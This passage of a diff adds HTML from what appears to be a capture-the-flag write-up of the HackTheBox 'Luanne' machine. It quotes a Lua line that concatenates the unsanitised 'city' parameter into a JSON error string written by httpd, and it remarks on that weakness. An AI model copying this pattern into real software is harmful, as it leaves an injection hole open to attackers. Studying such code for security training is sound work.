+<span class="n">httpd</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s1">'"error": "unknown city: '</span> <span class="o">..</span> <span class="n">city</span> <span class="o">..</span> <span class="s1">'"}'</span><span class="p">)</span>        
+</code></pre></div></div>
+<p>This time it’s just appending the city into the string, and then passing that to <code class="language-plaintext highlighter-rouge">http.write</code>.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2021/03/27/htb-luanne.html"></a>
+</article>
